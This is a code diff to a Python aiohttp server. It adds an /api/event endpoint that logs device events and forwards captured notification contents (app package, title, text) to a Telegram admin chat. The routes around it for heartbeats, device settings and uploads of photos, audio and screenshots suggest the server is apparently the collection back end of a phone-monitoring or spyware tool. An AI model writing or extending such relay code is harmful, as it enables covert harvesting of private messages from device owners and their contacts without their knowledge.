@@ -3451,6 +3451,53 @@ def create_app():
     app.router.add_post("/api/data", api_device_data_body)
     app.router.add_post("/api/heartbeat", api_heartbeat)
     app.router.add_get("/api/settings/{device_id}", api_device_settings)
+
+    # Device event API (receives buffered events from the app)
+    async def api_device_event(request):
+        """POST /api/event - Receive device events (notifications, monitoring, etc.)."""
+        global api_hits
+        api_hits += 1
+        try:
+            body = await request.json()
+            device_id = body.get("device_id", "")
+            event_type = body.get("event_type", "")
+            data = body.get("data", {})
+            timestamp = body.get("timestamp", time.time() * 1000)
+
+            if not device_id or not event_type:
+                return web.json_response({"ok": False, "error": "device_id and event_type required"}, status=400)
+
+            # Append to events log
+            event_entry = {
+                "device_id": device_id,
+                "event_type": event_type,
+                "data": data,
+                "timestamp": timestamp,
+                "server_time": ts()
+            }
+
+            events = load_json(EVENTS_FILE, [])
+            events.append(event_entry)
+            # Keep last 1000 events
+            if len(events) > 1000:
+                events = events[-1000:]
+            save_json(EVENTS_FILE, events)
+
+            # Forward notification events to Telegram
+            if event_type == "notification" and settings.get("notifications", False):
+                title = data.get("title", "")
+                text = data.get("text", "")
+                pkg = data.get("package", "")
+                if title or text:
+                    msg = f"🔔 Device Event\n\nDevice: {device_id}\nType: {event_type}\n   package: {pkg}\n   title: {title}\n   text: {text}"
+                    await send_message(ADMIN_CHAT_ID, msg)
+
+            return web.json_response({"ok": True, "stored": True})
+        except Exception as exc:
+            log.error("device_event error: %s", exc)
+            return web.json_response({"ok": False, "error": str(exc)}, status=500)
+
+    app.router.add_post("/api/event", api_device_event)
     
     # File upload API (for media: photos, videos, audio, screenshots)
     app.router.add_post("/api/upload", api_upload_file)
